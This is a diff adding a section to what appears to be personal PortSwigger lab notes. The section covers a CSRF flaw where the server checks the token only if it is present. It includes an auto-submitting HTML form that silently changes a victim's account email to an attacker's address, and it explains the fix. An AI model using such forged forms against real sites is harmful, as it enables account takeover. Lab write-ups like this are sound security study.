@@ -54,3 +54,23 @@
 **Tools:** Burpsuite (Repeater), PortSwigger exploit server, hand-written HTML/JS.
 
 ---
+
+## Category:  CSRF where token validation depends on token being present
+
+**Approach**: As from the lab, we already know that the change email functionality is CSRF vulnerable so we take a test by removing the entire input field from our payload and it gets succeeded, demonstrating that the lab only validates the token if it present. 
+
+→ Build the PoC form with `method="POST"` by removing the csrf input field.
+```html
+<form id="csrf-form" action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+<script>
+    document.getElementById("csrf-form").submit();
+</script>
+```
+
+**Why**: CSRF token only validated if the parameter exists in the request → omit the csrf field entirely from the forged form → server's "if present, validate" logic has no else-branch rejecting absence → fix: require the token parameter unconditionally — treat a missing token exactly the same as an invalid one (both = reject)
+
+**Tools**: Burpsuite
+
+---
